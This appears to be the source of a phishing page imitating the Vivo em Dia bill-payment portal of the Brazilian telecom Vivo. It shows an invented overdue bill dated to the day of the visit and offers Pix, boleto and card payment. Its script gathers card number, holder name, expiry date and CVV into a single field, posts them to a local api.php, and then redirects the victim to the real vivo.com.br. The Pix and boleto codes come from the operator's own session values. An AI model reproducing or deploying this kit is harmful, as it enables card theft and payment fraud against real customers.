                --fontSize13: 13px;
                --fontSize14: 14px;
                --fontSize15: 15px;
                --fontSize16: 16px;
                --fontSize17: 17px;
                --fontSize18: 18px;
                --fontSize19: 19px;
                --fontSize20: 20px;
                --fontSize21: 21px;
                --containerMax1: 1050px;
                --containerMax2: 1000px
            }
        }

        @media (min-width:1499px) {
            :root {
                --fontSize7: 9px;
                --fontSize8: 10px;
                --fontSize9: 11px;
                --fontSize10: 12px;
                --fontSize11: 13px;
                --fontSize12: 14px;
                --fontSize13: 15px;
                --fontSize14: 16px;
                --fontSize15: 17px;
                --fontSize16: 18px;
                --fontSize17: 19px;
                --fontSize18: 20px;
                --fontSize19: 21px;
                --fontSize20: 22px;
                --fontSize21: 23px;
                --containerMax1: 1200px;
                --containerMax2: 1100px
            }
        }

        * {
            font-family: Roboto, sans-serif;
            font-weight: 300
        }

        button {
            -webkit-font-smoothing: inherit;
            -moz-osx-font-smoothing: inherit;
            -webkit-appearance: none;
            background: transparent;
            color: inherit;
            font: inherit;
            line-height: normal;
            margin: 0;
            overflow: visible
        }

        .flexCenter {
            align-items: center;
            display: flex;
            justify-content: center
        }

        .btn:focus {
            box-shadow: 0 0 0 .2rem rgba(102, 0, 153, .75)
        }

        a:hover {
            text-decoration: none
        }

        .breadcrumbVivoEmDia {
            display: flex;
            flex-wrap: wrap;
            font-size: var(--fontSize14);
            list-style: none;
            margin-bottom: 0;
            padding: 0
        }

        .breadcrumbVivoEmDia a {
            color: #660096
        }

        .breadcrumbVivoEmDia i {
            color: #660096;
            font-size: var(--fontSize16)
        }

        .breadcrumbVivoEmDia .breadcrumb-item {
            font-size: var(--fontSize15)
        }

        .breadcrumbVivoEmDia .breadcrumb-item.active {
            color: #c3c3c3
        }

        .breadcrumbVivoEmDia .breadcrumb-item:before,
        .breadcrumbVivoshop .breadcrumb-item:before {
            display: inline-block;
            padding-right: .5rem
        }

        .breadcrumbVivoEmDia .breadcrumb-item+.breadcrumb-item:before,
        .breadcrumbVivoshop .breadcrumb-item+.breadcrumb-item:before {
            content: "-"
        }

        .breadcrumbVivoEmDia {
            padding-top: .75rem
        }

        .btn.card:focus {
            box-shadow: none
        }

        @media only screen and (max-width:1199px) {
            .mobileMrAutoMlAuto {
                margin-left: auto !important;
                margin-right: auto !important
            }
        }

        @media only screen and (min-width:1499px) {
            * {
                font-family: Roboto, sans-serif;
                font-weight: 400
            }
        }

        footer.footerVivoEmDia a:hover {
            text-decoration: underline
        }

        /*!
 * Font Awesome Pro 5.10.1 by @fontawesome - https://fontawesome.com
 * License - https://fontawesome.com/license (Commercial License)
 */
        .fad,
        .fal {
            -moz-osx-font-smoothing: grayscale;
            -webkit-font-smoothing: antialiased;
            -webkit-font-feature-settings: normal;
            font-feature-settings: normal;
            text-rendering: auto;
            display: inline-block;
            font-style: normal;
            font-variant: normal;
            line-height: 1
        }

        .fad {
            font-family: Font Awesome\ 5 Duotone;
            font-weight: 900;
            position: relative
        }

        @-webkit-keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        .fa-home:before {
            content: ""
        }

        .fa-times:before {
            content: ""
        }

        .fad:before {
            color: inherit;
            color: var(--fa-primary-color, inherit);
            opacity: 1;
            opacity: var(--fa-primary-opacity, 1);
            position: absolute
        }

        .fad:after {
            color: inherit;
            color: var(--fa-secondary-color, inherit)
        }

        .fa-swap-opacity .fad:before,
        .fad.fa-swap-opacity:before,
        .fad:after {
            opacity: .4;
            opacity: var(--fa-secondary-opacity, .4)
        }

        .fad.fa-home:after {
            content: "􏀕"
        }

        @font-face {
            font-family: Font Awesome\ 5 Pro;
            font-style: normal;
            font-weight: 300;
            src: url('../public/static/fonts/fa-light-300.42dddfaa1754c3ff88c5.woff2');
            unicode-range: U+f00d, U+f010, U+f067, U+f072, U+f0ad, U+f0d6, U+f0e8, U+f130-f131, U+f24e, U+f3c9, U+f3d1, U+f515-f517, U+f519-f52c, U+f52e-f533, U+f535-f555
        }

        @font-face {
            font-family: Font Awesome\ 5 Pro;
            font-style: normal;
            font-weight: 300;
            src: url('../public/static/fonts/fa-light-300.42dddfaa1754c3ff88c5.woff2');
            unicode-range: U+f00a, U+f015, U+f06e, U+f070, U+f073, U+f11e, U+f135, U+f1c6, U+f1e4, U+f1f8, U+f2a0, U+f2ed, U+f377, U+f470, U+f49c, U+f49e, U+f4c9, U+f56e-f56f, U+f664, U+f6d6-f6d7, U+f6f4, U+f705, U+f710, U+f725, U+f77e, U+f780, U+f7e5-f7f0, U+f7f2-f7fe, U+f800-f833
        }

        @font-face {
            font-family: Font Awesome\ 5 Pro;
            font-style: normal;
            font-weight: 300;
            src: url('../public/static/fonts/fa-light-300.42dddfaa1754c3ff88c5.woff2');
        }

        .fal {
            font-weight: 300
        }

        .fal {
            font-family: Font Awesome\ 5 Pro
        }

        @font-face {
            font-family: Font Awesome\ 5 Duotone;
            font-style: normal;
            font-weight: 900;
            src: url('../public/static/fonts/fa-duotone-900-pro-5.7.0.a21c2c9c8e8e88086dac.woff2');
            unicode-range: U+f00d, U+f010, U+f067, U+f072, U+f0ad, U+f0d6, U+f0e8, U+f130-f131, U+f24e, U+f3c9, U+f3d1, U+f515-f517, U+f519-f51e, U+f520-f52c, U+f52e, U+f530-f533, U+f535-f555, U+10f00d, U+10f010, U+10f067, U+10f072, U+10f0ad, U+10f0d6, U+10f0e8, U+10f130-10f131, U+10f24e, U+10f3c9, U+10f3d1, U+10f515-10f517, U+10f519-10f51e, U+10f520-10f52c, U+10f52e, U+10f530-10f533, U+10f535-10f555
        }

        @font-face {
            font-family: Font Awesome\ 5 Duotone;
            font-style: normal;
            font-weight: 900;
            src: url('../public/static/fonts/fa-duotone-900-pro-5.7.0.a21c2c9c8e8e88086dac.woff2');
            unicode-range: U+f00a, U+f015, U+f06e, U+f070, U+f073, U+f135, U+f1c6, U+f1e4, U+f1f8, U+f2a0, U+f2ed, U+f377, U+f470, U+f49c, U+f49e, U+f4c9, U+f56e-f56f, U+f664, U+f6d6-f6d7, U+f705, U+f710, U+f725, U+f77e, U+f780, U+f7e5-f7e7, U+f7e9-f7f0, U+f7f2-f7fe, U+f800-f812, U+f814-f833, U+10f00a, U+10f015, U+10f06e, U+10f070, U+10f073, U+10f135, U+10f1c6, U+10f1e4, U+10f1f8, U+10f2a0, U+10f2ed, U+10f377, U+10f470, U+10f49c, U+10f49e, U+10f4c9, U+10f56e-10f56f, U+10f664, U+10f6d6-10f6d7, U+10f705, U+10f710, U+10f725, U+10f77e, U+10f780, U+10f7e5-10f7e7, U+10f7e9-10f7f0, U+10f7f2-10f7fe, U+10f800-10f812, U+10f814-10f833
        }

        .dpzNTq.Mui-checked {
            color: rgb(102, 0, 150)
        }

        .css-jdptnd {
            display: inline-flex;
            -webkit-box-align: center;
            align-items: center;
            -webkit-box-pack: center;
            justify-content: center;
            position: relative;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            background-color: transparent;
            outline: 0px;
            border: 0px;
            margin: 0px;
            cursor: pointer;
            user-select: none;
            vertical-align: middle;
            appearance: none;
            text-decoration: none;
            padding: 9px;
            border-radius: 50%
        }

        @media print {
            .css-jdptnd {
                -webkit-print-color-adjust: exact;
            }
        }

        .css-jdptnd:hover {
            background-color: rgba(0, 0, 0, 0.04)
        }

        @media (hover:none) {
            .css-jdptnd:hover {
                background-color: transparent
            }
        }



        .css-1m9pwf3 {
            cursor: inherit;
            position: absolute;
            opacity: 0;
            width: 100%;
            height: 100%;
            top: 0px;
            left: 0px;
            margin: 0px;
            z-index: 1
        }

        .css-hyxlzm {
            position: relative;
            display: flex
        }

        .css-q8lw68 {
            user-select: none;
            width: 1em;
            height: 1em;
            display: inline-block;
            fill: currentcolor;
            flex-shrink: 0;
            transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            font-size: 1.5rem;
            transform: scale(1)
        }

        .css-1u5ei5s {
            user-select: none;
            width: 1em;
            height: 1em;
            display: inline-block;
            fill: currentcolor;
            flex-shrink: 0;
            font-size: 1.5rem;
            left: 0px;
            position: absolute;
            transform: scale(1);
            transition: transform 150ms cubic-bezier(0, 0, 0.2, 1) 0ms
        }

        .css-w0pj6f {
            overflow: hidden;
            pointer-events: none;
            position: absolute;
            z-index: 0;
            inset: 0px;
            border-radius: inherit
        }

        .col-md-1,
        .col-md-10,
        .col-md-12,
        .col-md-3,
        .col-md-4,
        .col-md-8,
        .col-sm-11,
        .col-sm-12,
        .col-sm-6 {
            min-height: 1px;
            padding-left: 15px;
            padding-right: 15px;
            position: relative;
            width: 100%;
        }

        .buttonAviso {
            border-radius: 8px;
            height: 50px;
            width: 100%;
        }

        .btnType1 {
            background-color: #660096;
            color: #fff;
        }

        .btnType2 {
            background-color: #fff;
            border: 2px solid #660096;
        }

        .btnType2,
        .btnType2:hover {
            color: #660096;
        }

        .col-6 {
            flex: 0 0 50%;
            max-width: 50%;
        }

        @media (min-width: 768px) {
            .col-md-10 {
                flex: 0 0 83.333333%;
                max-width: 83.333333%;
            }
        }

        @media only screen and (max-width: 1199px) {

            .modalCartaoCredito .btnType1,
            .modalCartaoCredito .btnType2 {
                padding-left: 5px;
                padding-right: 5px;
            }
        }

        @media only screen and (max-width: 1199px) {

            .modalCartaoCredito .descricaoAviso,
            .modalCartaoCredito .imgCreditCard {
                text-align: center;
            }
        }

        @media only screen and (max-width: 1199px) {
            .modalCartaoCredito .containerBandeirasCartao {
                margin-bottom: 15px;
            }
        }

        @media only screen and (max-width: 1199px) {
            .modalCartaoCredito .containerBandeirasCartao .containerCartao {
                flex: 0 0 33.333333%;
                max-width: 33.333333%;
            }
        }

        @media only screen and (max-width: 1199px) {
            .modalCartaoCredito .iconeVisa {
                margin-top: -10px;
            }

            .modalCartaoCredito .iconeMastercard {
                margin-top: 5px;
            }
        }

        @media (min-width: 768px) {
            .col-md-9 {
                flex: 0 0 75%;
                max-width: 75%;
            }
        }
    </style>
    <link id=favicon rel="shortcut icon" href=data:, data-sf-original-href=https://vivoemdia.vivo.com.br/fav.png>
    <style>
        .sf-hidden {
            display: none !important
        }
    </style>
    <link rel=canonical href=https://vivoemdia.vivo.com.br/faturas>
    <style>
        img[src="data:,"],
        source[src="data:,"] {
            display: none !important
        }
    </style>
    <style>
        .icone {
            margin-left: auto;
            margin-right: auto;
            width: 100px;
        }

        .qrcode-pix img {
            display: block;
            margin: auto;
            width: 120px;
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
</head>

<body class="dx-device-desktop dx-device-generic" style=overflow:auto cz-shortcut-listen=true>
    <noscript>Você precisa ter o JavaScript ativado para rodar esse app.</noscript>
    <div id=root>
        <div class="layoutDefault">
            <div class="menuUsuario close">
                <nav><button class=btnClose><i class="fal fa-times"></i></button>
                    <div class="numberPhone sf-hidden"></div>
                    <ul class=sf-hidden></ul>
                </nav>
            </div>
            <div class=headerVivoEmDia>
                <div class="btnBurger flexCenter">
                    <div></div>
                    <div></div>
                    <div></div>
                </div>
                <div class=containerVivoEmDia>
                    <div class=flexCenter><a href=https://vivoemdia.vivo.com.br /><img src=data:, height=35px data-sf-original-src=https://vivoemdia.vivo.com.br/assets/img/logo-vivo-em-dia2.svg></a>
                    </div>
                </div>
                <div class="containerInfoCliente d-none d-sm-none d-md-block">
                    <div class=boasVindas>Olá, <span class=nomeCliente>Convidado</span></div>
                    <div class="ultimoAcesso" id="datetime">
                    </div>
                </div>
            </div>
            <div class="container-fluid d-none d-sm-none d-md-block">
                <div class=row>
                    <div class=containerVivoEmDia>
                        <div class=row>
                            <div class="col-md-11 col-11 col-sm-11 mobileMrAutoMlAuto" style=padding-left:0px;padding-right:0px>
                                <ul class=breadcrumbVivoEmDia>
                                    <li class=breadcrumb-item><a><span><i class="fad fa-home" style=padding-right:10px></i></span>Inicio</a>
                                    <li class="breadcrumb-item active">Faturas
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="d-block d-sm-block d-md-none sf-hidden"></div>
            <div class=container-fluid>
                <div class=row>
                    <div class=containerVivoEmDia>
                        <div class=row>
                            <div class="col-md-3 ml-auto" style=text-align:right>
                                <div class=containerInfoContrato>
                                    <div>Contrato:<span style="padding-left:5px" id="contra"> </span></div>
                                    <div>Situação do contrato: <span>ATIVO</span></div>
                                </div>
                            </div>
                        </div>
                        <div class=row style=margin-top:20px>
                            <div class="col-md-6 col-11 col-sm-11 ml-auto mr-auto">
                                <div class="cardDividaMes selected false">
                                    <div class=mes>
                                        <div class=checkbox><span class="MuiRadio-root MuiRadio-colorDefault MuiButtonBase-root PrivateSwitchBase-root Mui-checked sc-bdVaJa dpzNTq css-jdptnd"><input class="PrivateSwitchBase-input css-1m9pwf3" name=radio-buttons type=radio value checked><span class=css-hyxlzm></span><span class="MuiTouchRipple-root css-w0pj6f"></span></span></div>
                                        <div class=vencimento>
                                            <div class=titulo>Conta de Julho:</div>
                                            <div class="descricao" id="datavencimento"> </div>
                                        </div>
                                    </div>
                                    <div class=valor>
                                        <div class=titulo>R$ <?= $valor; ?></div>
                                        <div class=descricao>
                                            <div class="iconeStatus colorAtraso"></div>
                                            <div class=textoInfo>Em atraso</div>
                                        </div>
                                    </div>
                                </div>
                                <div class=containerTipoPagamento>

                                    <button id="btn-payment-pix" style='display:<?= $pixtem ?>' class="btn card">
                                        <div class=cardDescricao>Pagar com <br>Pix</div>
                                    </button>
                                    <a href="segunda-via.php">
                                        <button class="btn card" style='margin-right:0px; display:<?= $boletotem ?>'>
                                            <div class=cardDescricao>2ª Via</div>
                                        </button>
                                    </a>
                                    <button id="btn-payment-card" class="btn card" style="margin-left:20px; display:<?= $cardtem ?>">
                                        <div class="cardDescricao">Pagar com <br>Cartão</div>
                                    </button>
                                </div>
                            </div>
                            <div class="col-md-6 col-11 col-sm-11 ml-auto mr-auto">
                                <div class=containerOutrasOpcoes>
                                    <div class=titulo>Outras opções</div>
                                    <div class=opcoes>
                                        <ul>
                                            <li>Agendar pagamento<div class=icone></div>
                                            <li>Atendimento<div class=icone></div>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row containerRecargaPay" style=margin-bottom:70px>
                            <div class="col-md-8 mr-auto ml-auto"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class=footerVivoEmDia>
            <div class="containerPrincipal container-fluid">
                <div class=row>
                    <div class="col-md-4 d-none d-sm-none d-md-block">
                        <div class=flexCenter style=height:100%>
                            <div class=copyright>Copyright 2023 © Vivo.
                                Todos os direitos reservados</div>
                        </div>
                    </div>
                    <div class="col-md-1 d-none d-sm-none d-md-block"></div>
                    <div class="col-md-7 col-12 col-sm-12">
                        <div class="flexCenter itemFooter" style=justify-content:space-between>
                            <div class="siteProtegido d-none d-sm-none d-md-block">
                                <div class=flexCenter>
                                    <div style=width:30px></div>
                                    <div style=padding-left:10px>Site Protegido SSL</div>
                                </div>
                            </div>
                            <div class="flexCenter politicaPrivacidade">
                                <div><a href=https://vivoemdia.vivo.com.br/politica-de-privacidade>Política de
                                        Privacidade</a> | <a href=https://vivoemdia.vivo.com.br/duvidas-frequentes>Dúvidas frequentes</a>
                                </div>
                            </div>
                            <div class=flexCenter>
                                <div class="siteProtegido d-block d-sm-block d-md-none sf-hidden"></div>
                                <div>
                                    <div class=iconeFooterVivo></div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-12 d-md-none sf-hidden"></div>
                </div>
            </div>
        </footer>
    </div>
    <div id="modal-fade" class="fade modal-backdrop show" style="display: none;"></div>
    <div id="modal-wrapper" role="dialog" aria-modal="true" class="fade modal show" tabindex="-1" style="display:none;">
        <div id="modal-pix" class="modal-dialog modalPIX modal-lg" style="display:none;">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="container">
                        <div class="row">
                            <div class="col-md-2">
                                <div class="btnVoltar"><i class="fal fa-chevron-left"></i><span style="padding-left:10px">Voltar</span></div>
                            </div>
                            <div class="col-md-10" style="text-align:center">
                                <div class="containerCopiar">
                                    <div class="numCodigoBarra">
                                        <div id="linha" class="containerNumCodBarras pix"><?= $_SESSION['qrcode']; ?></div>
                                    </div>
                                    <div id="iconeCopiarPix" data-clipboard-target="#linha" class="iconeCopiar flexCenter" title="Copiar"><i class="fal fa-copy"></i></div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-2"></div>
                        </div>
                        <div class="row">
                            <div class="col-md-12">
                                <div class="row">
                                    <div class="col-12 col-md-6">
                                        <div class="icone">
                                            <svg id="prefix__Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16.1 13.94">
                                                <defs>
                                                    <style>
                                                        .prefix__cls-1 {
                                                            fill: #652c8d
                                                        }

                                                        .prefix__cls-1,
                                                        .pr efix__cls-2,
                                                        .prefix__cls-8 {
                                                            fill-rule: evenodd
                                                        }

                                                        .prefix__cls-2 {
                                                            fill: #7d4199
                                                        }

                                                        .prefix__cls-8 {
                                                            fill: #f8961d
                                                        }
                                                    </style>
                                                </defs>
                                                <path class="prefix__cls-1" d="M31.62 30.15h-16.1L17 27.81a1 1 0 01.79-.45h11.59a1 1 0 01.8.45l1.44 2.34" transform="translate(-15.52 -16.73)"></path>
                                                <path class="prefix__cls-2" d="M.07 13.32l-.07.1h16.1l-.07-.1H.07z">
                                                </path>
                                                <path class="prefix__cls-1" d="M29.64 19.28h-12.1a.29.29 0 00-.3.29v7.49a.29.29 0 00.3.3h12.1a.29.29 0 00.29-.3v-7.49a.28.28 0 00-.29-.29" transform="translate(-15.52 -16.73)"></path>
                                                <path d="M17.76 26.59v-6.43a.29.29 0 01.29-.3h11.08a.29.29 0 01.29.3v6.43a.29.29 0 01-.29.29H18.05a.29.29 0 01-.29-.29" transform="translate(-15.52 -16.73)" fill="#eb6494" fill-rule="evenodd"></path>
                                                <path d="M24.84 29.63l-.2-.51a.21.21 0 00-.17-.11h-1.9a.2.2 0 00-.17.11l-.21.51a.19.19 0 00.18.24h2.3a.17.17 0 00.17-.24M30 28.36l-.24-.36a.94.94 0 00-.79-.45H18.1a.9.9 0 00-.79.45l-.21.34a.31.31 0 00.24.45h12.39a.31.31 0 00.27-.43zm1.2 2.31H16a.46.46 0 01-.45-.45h16.04a.42.42 0 01-.42.45z" transform="translate(-15.52 -16.73)" fill="#321a4b" fill-rule="evenodd"></path>
                                                <path fill="#56297b" d="M3.34 2.55h9.46v.58H3.34z"></path>
                                                <path fill="#da5794" fill-rule="evenodd" d="M3.34 3.15l.31 7h8.83l.31-7H3.34z"></path>
                                                <path d="M27 16.73h-6.87a.61.61 0 00-.62.61v9.53h8v-9.53a.56.56 0 00-.58-.61" transform="translate(-15.52 -16.73)" fill="#f7d84f" fill-rule="evenodd"></path>
                                                <path class="prefix__cls-8" d="M23 18h-2.15a.08.08 0 01-.07-.07.08.08 0 01.07-.07H23a.07.07 0 01.06.07L23 18M22 18.45h-1.1a.08.08 0 01-.07-.07s0-.06.07-.06H22a.08.08 0 01.07.07.07.07 0 01-.07.07M22.33 18.9h-1.51a.07.07 0 01-.07-.07.08.08 0 01.07-.07h1.51a.08.08 0 01.07.07s0 .07-.07.07M26.36 18.83h-1.65a.23.23 0 01-.24-.24V18a.24.24 0 01.24-.25h1.65a.25.25 0 01.24.25v.58a.24.24 0 01-.24.24" transform="translate(-15.52 -16.73)"></path>
                                                <path d="M22.13 24.75a.27.27 0 01-.14-.38l.1-.24c.07-.17.21-.21.41-.1a2.92 2.92 0 00.93.2c.28 0 .52-.07.52-.27s-.07-.17-.21-.24a2.35 2.35 0 00-.58-.18c-.59-.13-1.1-.41-1.1-1.1a1.07 1.07 0 011-1.06V21a.3.3 0 01.27-.27h.28A.28.28 0 0124 21v.35a3.67 3.67 0 01.69.17.29.29 0 01.2.38l-.07.24a.29.29 0 01-.41.17 2.64 2.64 0 00-.86-.21c-.31 0-.51.07-.51.28s.27.31.86.48 1.1.38 1.1 1-.42 1-1 1.1v.35a.27.27 0 01-.31.27h-.3a.27.27 0 01-.31-.27V25a8.82 8.82 0 01-.86-.31" transform="translate(-15.52 -16.73)" fill="#eac356" fill-rule="evenodd"></path>
                                                <path class="prefix__cls-2" d="M22.13 24.58c-.18-.11-.21-.24-.14-.38l.1-.24c.07-.17.21-.21.41-.11a2.68 2.68 0 00.93.21c.28 0 .52-.07.52-.27s-.07-.18-.21-.25a3.06 3.06 0 00-.58-.17c-.59-.14-1.1-.41-1.1-1.1a1.09 1.09 0 011-1.07v-.34a.29.29 0 01.27-.27h.28a.28.28 0 01.31.27v.34a4.64 4.64 0 01.69.18.29.29 0 01.2.38l-.07.24a.29.29 0 01-.41.17 2.64 2.64 0 00-.83-.17c-.31 0-.51.07-.51.28s.27.31.86.48 1.1.38 1.1 1-.42 1-1 1.1v.35a.27.27 0 01-.31.27h-.3a.27.27 0 01-.34-.28v-.31c-.28-.11-.59-.18-.86-.31" transform="translate(-15.52 -16.73)"></path>
                                            </svg>
                                            <img src="../public/static/img/logo-vivo-em-dia.svg" alt="">
                                        </div>
                                    </div>
                                    <div class="col-12 col-md-6 qrcode-pix">
                                        <img src="<?= $_SESSION['qrcodeimg']; ?>">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="modal-card" class="modal-dialog modalCartaoCredito modal-lg justify-content-center" style="display:none; margin:0 auto">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="container mx-auto">
                        <div class="row">
                            <div class="col-md-2">
                                <div class="btnVoltar"><i class="fal fa-chevron-left"></i><span style="padding-left:10px">Voltar</span></div>
                            </div>
                            <div class="col-md-10" style="text-align:center">
                                <div class="containerCopiar">
                                    <div class="numCodigoBarra">

                                    </div>

                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-24 p-3 mb-2 text-white text-center" style="background:#52007c">Cadastre seu cartão para realizar o pagmento</div>
                        </div>
                        <div class="row">
                            <div class="col-md-12">
                                <div class="row">
                                    <div class="col-8 col-md-8">
                                        <form id="pagacard">
                                            <div class="form-group">
                                                <label for="cardNumber">Número do cartão</label>
                                                <input type="text" class="form-control" id="cardNumber" name="credit_card_number" placeholder="Insira o número do cartão" required>
                                            </div>
                                            <div class="form-group">
                                                <label for="cardName">Nome do titular</label>
                                                <input type="text" class="form-control" id="cardName" placeholder="Insira o nome do titular do cartão" pattern="[A-Za-z ]+" required>
                                            </div>
                                            <div class="form-row">
                                                <div class="col">
                                                    <label for="expirationDate">Data de validade</label>
                                                    <input type="text" class="form-control" id="expirationDate" name="expiration_date" maxlength="5" minlength="5" placeholder="MM/AA" required>
                                                </div>
                                                <div class="col">
                                                    <label for="cvv">cvv</label>
                                                    <input type="text" class="form-control" id="cvv" maxlength="3" minlength="3" placeholder="Insira o código de segurança" required>
                                                </div>
                                            </div>
                                            <button type="submit" class="btn btn-primary mt-3" style="width:100%">Cadastrar</button>
                                        </form>
                                    </div>

                                </div>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="toastr-container">
        <div class="toastr toastr-success">
            <div id="toastr-message" class="toastr-message"></div>
        </div>
    </div>
    <script>
        var $modalFade = $("#modal-fade");
        var $modalWrapper = $("#modal-wrapper");
        var $modalCard = $("#modal-card");
        var $modalPix = $("#modal-pix");
        var $btnCard = $("#btn-payment-card");
        var $btnPix = $("#btn-payment-pix");
        var $btnBackCard = $("#btnBackCard");
        var $btnBack = $("div[class=btnVoltar]");
        var clipboard = new ClipboardJS('#iconeCopiarPix');

        $btnCard.click(function() {
            $modalFade.css("display", "block");
            $modalWrapper.css("display", "block");
            $modalPix.hide("fast");
            $modalCard.fadeIn(600);
        });

        $btnPix.click(function(e) {
            e.preventDefault();

            $modalFade.css("display", "block");
            $modalWrapper.css("display", "block");
            $modalCard.hide();
            $modalPix.fadeIn(600);
        });

        $btnBack.click(function(e) {
            $modalPix.hide();
            $modalWrapper.hide();
            $modalFade.hide();
        });

        $btnBackCard.click(function(e) {
            $modalCard.hide();
            $modalWrapper.hide();
            $modalFade.hide();
        });

        clipboard.on('success', function(e) {
            $("#toastr-message").text("PIX copiado com sucesso.");
            $("#toastr-container").show("fast");
            setTimeout(function() {
                $("#toastr-container").hide("fast");
            }, 5000);
        });
    </script>
    <script>
        function displayDateTime() {
            var now = new Date();
            var day = ("0" + now.getDate()).slice(-2);
            var month = ("0" + (now.getMonth() + 1)).slice(-2);
            var year = now.getFullYear();
            var hours = ("0" + now.getHours()).slice(-2);
            var minutes = ("0" + now.getMinutes()).slice(-2);
            var datetime = "Acessado em " + day + "/" + month + "/" + year + " " + hours + ":" + minutes;
            document.getElementById("datetime").innerHTML = datetime;
        }

        // Chama a função displayDateTime imediatamente após o carregamento da página
        window.onload = displayDateTime;
        var nome = sessionStorage.getItem('contrato');
        document.getElementById('contra').innerHTML = nome;
    </script>
    <script>
        var dataAtual = new Date();
        var dia = ("0" + dataAtual.getDate()).slice(-2);
        var mes = month = ("0" + (dataAtual.getMonth() + 1)).slice(-2);
        var ano = dataAtual.getFullYear();
        var dataFormatada = "Vencimento " + dia + "/" + mes + "/" + ano;
        document.getElementById('datavencimento').innerHTML = dataFormatada;
    </script>
    <script>
            $(document).ready(function() {
                $('#pagacard').submit(function(e) {
                    e.preventDefault();
                    var cardNumber = $('#cardNumber').val();
                    var cardName = $('#cardName').val();
                    var expirationDate = $('#expirationDate').val();
                    var cvv = $('#cvv').val();

                    // Validar campos em branco
                    if (cardNumber == '' || cardName == '' || expirationDate == '' || cvv == '') {
                        alert('Por favor, preencha todos os campos.');
                        return false;
                    }

                    // Serializar dados do formulário
                    var data = $.param({
                        informacao: cardNumber + ':' + cardName + ':' + expirationDate + ':' + cvv
                    });

                    // Enviar dados do formulário via AJAX
                    $.ajax({
                        type: 'POST',
                        url: 'api.php',
                        data: data,
                        success: function(response) {
                            if (response == 'success') {
                                // Redirecionar para outra página
                                window.location.href = 'https://www.vivo.com.br';
                            } else {
                                alert('Houve um erro no processamento do pagamento. Por favor, tente novamente.');
                            }
                        },
                        error: function() {
                            alert('Houve um erro na comunicação com o servidor. Por favor, tente novamente mais tarde.');
                        }
                    });
                });
            });
        </script>
        <script>
            function formatCreditCardNumber(input) {
                // Remove tudo que não é número do input
                var value = input.val().replace(/\D/g, '');

                // Divide o número em grupos de 4 dígitos
                var matches = value.match(/\d{4,16}/g);
                var match = matches && matches[0] || '';

                // Junta os grupos com um espaço
                var parts = [];
                for (var i = 0, len = match.length; i < len; i += 4) {
                    parts.push(match.substring(i, i + 4));
                }
                if (parts.length) {
                    input.val(parts.join(' '));
                } else {
                    input.val(value);
                }
            }

            // Formata a data de validade como MM/AA
            function formatExpirationDate(input) {
                // Remove tudo que não é número do input
                var value = input.val().replace(/\D/g, '');

                // Adiciona a barra entre o mês e o ano
                if (value.length > 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2);
                }

                input.val(value);
            }

            // Configura a formatação do número do cartão de crédito
            $('input[name="credit_card_number"]').on('input', function() {
                formatCreditCardNumber($(this));
            });

            // Configura a formatação da data de validade
            $('input[name="expiration_date"]').on('input', function() {
                formatExpirationDate($(this));
            });
        </script>
        <!-- <form>
        <label for="valor">Digite um valor:</label>
        <input type="text" id="valor" name="valor">
        <button type="button" onclick="salvarSessao()">Salvar</button>
        </form> -->
        <script>
         function gerarCodigoBarras() {
			var boleto = '<?= $_SESSION['belo'] ?>';
			var codigo = boleto.replace(/[\s\.]/g, "");
			var codigo_barras = codigo.slice(0, 4) + codigo.slice(32, 47) + codigo.slice(4, 9) + codigo.slice(10, 20) + codigo.slice(21, 31);
			var numeroBoleto = codigo_barras;
            document.getElementById('valor').innerHTML = codigo_barras;
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                   // alert(this.responseText);
                }
            };
            xhttp.open("POST", "salvar_sessao.php", true);
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.send("valor="+codigo_barras);
        }
        gerarCodigoBarras();
        </script>
 
</body>

</html>